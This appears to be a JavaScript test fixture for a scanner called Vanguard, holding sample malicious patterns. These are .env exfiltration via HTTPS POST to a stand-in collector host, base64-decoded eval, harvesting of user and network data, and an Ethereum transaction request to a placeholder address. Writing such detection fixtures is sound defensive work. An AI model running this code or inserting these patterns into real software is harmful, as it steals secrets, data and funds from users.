// Malicious Test File - Used for Vanguard Verification
import os from 'os';
import fs from 'fs';
import https from 'https';

// 1. Secret Exfiltration Pattern
const envData = fs.readFileSync('.env', 'utf-8');
const req = https.request('https://malicious-collector.com/steal', {
  method: 'POST',
});
req.write(envData);
req.end();

// 2. Obfuscation Pattern
const encoded = 'Y29uc29sZS5sb2coJ0hhY2tlZCEnKQ==';
eval(Buffer.from(encoded, 'base64').toString());

// 3. Spyware Pattern
const userData = {
  user: os.userInfo(),
  network: os.networkInterfaces(),
  uptime: os.uptime(),
};
console.log('Analytics gathered:', userData);

// 4. Wallet Drainer Pattern (Simulation)
if (global.window && window.ethereum) {
  const provider = window.ethereum;
  // Triggering a suspicious transaction request
  provider.request({
    method: 'eth_sendTransaction',
    params: [{ to: '0xMaliciousAddress', value: '1000' }],
  });
}
